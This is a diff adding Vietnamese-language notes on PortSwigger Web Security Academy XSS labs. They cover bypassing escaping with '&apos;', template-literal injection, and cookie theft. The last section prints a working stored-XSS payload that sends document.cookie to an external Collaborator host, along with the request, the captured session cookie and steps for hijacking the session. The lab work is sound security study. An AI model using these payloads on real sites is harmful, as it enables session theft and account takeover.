@@ -636,7 +636,7 @@ Inspect:
 - **HTML encoded**: 
     - `<` và `>` thành `&lt;` và `&gt;`
     - `"` thành `&quot;`
-- **Encapsed**: Tức thêm `\` đăng trức kí tự 
+- **Encapsed**: Tức thêm `\` đăng trước kí tự 
     - `'` thành `\'`
 
 Mặc dù vậy, ký tự `\` chưa được xử lý
@@ -657,6 +657,123 @@ Mặc dù vậy, ký tự `\` chưa được xử lý
 ```
 - `\'` biến `'` thành kí tự đóng
 - Sau đó ngắn cách lệnh bằng `;` và `alert()` rồi `comment` lệnh đằng sau
+
+### Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+- **HTML encoded**: 
+    - `<` và `>` thành `&lt;` và `&gt;`
+    - `"` thành `&quot;`
+- **Encapsed**: Tức thêm `\` đăng trước kí tự 
+    - `'` thành `\'`
+    - `\` thành `\\`
+
+#### Testing in Website input
+Payload:
+```
+http://abc?'-alert()-'
+```
+
+Inspect:
+```html
+<a id="author" href="http://foo?\'-alert(1)-\'" onclick="var tracker={track(){}};tracker.track('http://foo?\'-alert(1)-\'');">a</a>
+```
+- `'` đã bị `server` escape 
+- Ý tưởng: Tấn công vào phần `javascript` khi `onclick` được kích hoạt
+- Sử dụng ký hiệu khác để `browser` có thể hiểu nó là `'`
+
+#### Exploit
+Payload:
+```
+http://abc?&apos;-alert()-&apos;
+```
+
+- Bỏ qua được filter của **server** với việc sử dụng `&apos;`
+- `&apos;` vì vậy **server** xử lý xong và trả về cho **browser** render ra
+- Mà **browser** lại hiểu được `&apos;` là `'`, nên render ra thành
+```html
+<a id="author" href="http://foo?\'-alert(1)-\'" onclick="var tracker={track(){}};tracker.track('http://foo?'-alert(1)-'');">a</a>
+```
+- `&apos;` là viết tắt entity HTML/XML đại diện cho dấu `'`
+- Ngoài ra còn có thể sử dụng `&#39;` cùng là `'`
+
+### Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+
+| Ký tự         | Ký hiệu | Tên tiếng Việt       | Unicode escaped |
+|---------------|---------|----------------------|-----------------|
+| Angle bracket | `<`     | Dấu ngoặc nhọn trái  | `\u003C`        |
+| Angle bracket | `>`     | Dấu ngoặc nhọn phải  | `\u003E`        |
+| Single quote  | `'`     | Dấu nháy đơn         | `\u0027`        |
+| Double quote  | `"`     | Dấu nháy kép         | `\u0022`        |
+| Backslash     | `\`     | Dấu gạch chéo ngược  | `\u005C`        |
+| Backtick      | `` ` `` | Dấu nháy ngược       | `\u0060`        |
+
+#### Testing with some symbol
+Inspect:
+```html
+<h1 id="searchMessage">0 search results for ''\`"<>'</h1>
+<script>
+    var message = `0 search results for '\u0027\u005c\u0060\u0022\u003c\u003e'`;
+    document.getElementById('searchMessage').innerText = message;
+</script>
+```
+Tất cả đều bị **unicode escaped** khi tìm `'\`"<>`
+
+#### Exploit
+Payload:
+```
+${alert(1)}
+```
+
+Inspect:
+```html
+<section class="blog-header">
+    <h1 id="searchMessage">0 search results for 'undefined'</h1>
+    <script>
+        var message = `0 search results for '${alert(1)}'`;
+        document.getElementById('searchMessage').innerText = message;
+    </script>
+</section>
+```
+
+- Trong **JavaScript**, bất cứ biểu thức nào bên trong dấu `${...}` trong **template literal** sẽ được thực thi
+- `` `string text ${expression} string text` `` là một **template literal**
+
+### Exploiting cross-site scripting to steal cookies
+#### Check if XSS can be excuted
+- Bình luận với comment sau:
+```
+<img src=1 onerror=alert(1)>
+```
+- Kiểm tra và thấy có thể thưc thi được XSS
+
+#### Exploit
+- Có thể lấy cookie thông qua việc gửi request ra bên ngoài
+- Ta sử dụng **Burp Colloborator** làm server nhận request đến
+- Có thể sử dụng **webhook** cho các trường hợp này, nhưng đối với lab của **PortSwigger**, để ngăn chặn nền tảng học viện được sử dụng để tấn công các bên thứ ba, firewall của họ đã chặn các tương tác giữa các phòng thí nghiệm và các hệ thống bên ngoài tùy ý.
+- Thêm sửa lại request thông qua repeater ở phần comment
+```html
+<img src=1 onerror="var cookie=document.cookie; fetch(`https://1877dlq2gnq6usllkj9gm1a9q0wrkk89.oastify.com/${cookie}`)">
+```
+
+- Request:
+
+```http
+POST /post/comment HTTP/2
+Host: 0a5b00ec03013c68803335f000c800fa.web-security-academy.net
+Cookie: session=2wyC26CpNb2pdgu9qlaSHx0l9cv0djTT
+
+...
+
+csrf=wxQyr53SHLiE20Y8PEYKxoJG4M3L0Ciy&postId=2&comment=<img+src=1+onerror="var+cookie=document.cookie;fetch(`https://1877dlq2gnq6usllkj9gm1a9q0wrkk89.oastify.com/${cookie}`)">&name=a&email=a%40gmail.com&website=http%3A%2F%2Fa.com
+```
+
+- Pool now trong **Burp Colloborator** để lấy request
+
+Receive:
+```http
+GET /secret=REHTIKjULCK5QSUjpVXpxA6IaBVhb1Gm;%20session=N7u8fdIdaT29iSlUmAlZSmuHswhAsZX0 HTTP/1.1
+Host: 1877dlq2gnq6usllkj9gm1a9q0wrkk89.oastify.com
+```
+- Dùng **Cookie Editor extension**, import cookie vừa lấy được
 
 ---
 Goodluck! 🍀🍀🍀
